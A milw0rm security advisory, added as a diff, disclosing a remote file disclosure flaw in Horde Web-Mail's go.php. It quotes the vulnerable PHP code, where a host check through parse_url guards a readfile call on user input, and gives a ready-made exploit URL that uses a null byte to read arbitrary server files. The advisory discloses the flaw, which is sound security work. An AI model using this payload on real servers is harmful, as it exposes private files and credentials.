@@ -1,0 +1,55 @@
+----[ Horde Web-Mail Remote File Disclosure ... ITDefence.ru Antichat.ru ]
+
+							Horde Web-Mail Remote File Disclosure
+							Eugene Minaev underwater@itdefence.ru
+				___________________________________________________________________
+			____/  __ __ _______________________ _______  _______________    \  \   \
+			/ .\  /  /_// //              /        \       \/      __       \   /__/   /
+			/ /     /_//              /\        /       /      /         /     /___/
+			\/        /              / /       /       /\     /         /         /
+			/        /               \/       /       / /    /         /__       //\
+			\       /    ____________/       /        \/    __________// /__    // /   
+			/\\      \_______/        \________________/____/  2007    /_//_/   // //\
+			\ \\                                                               // // /
+			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / . 
+			. \_\\________[________________________________________]_________//_//_/ . .
+			
+		At first look , this code is not vulnerable and we can only read remote files.
+		
+		<?php
+		
+		if (empty($_GET['url'])) {
+		exit;
+		}
+		if (get_magic_quotes_gpc()) {
+		$url = @parse_url(stripslashes($_GET['url']));
+		} else {
+		$url = @parse_url($_GET['url']);
+		}  
+		
+		.....
+		
+		if ((!empty($_SERVER['SERVER_NAME']) &&
+		$_SERVER['SERVER_NAME'] == $url['host']) ||
+		(!empty($_SERVER['HTTP_HOST']) &&
+		$_SERVER['HTTP_HOST'] == $url['host'])) { 
+	 
+		.....
+		
+		
+		if (!empty($_GET['untrusted'])) {
+		readfile($_GET['url']);
+		exit;
+		}  
+		
+		?>
+		
+		But parse_url is only a set of regular expressions and we can use nullbyte to deceive function.
+		
+		http://test1.ru/horde/util/go.php?untrusted=1&url=test.php%00http://another.host/
+
+----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]
+
+1st advisory: http://www.securityfocus.com/archive/1/427710/30/0/threaded
+
+# milw0rm.com [2008-01-06]
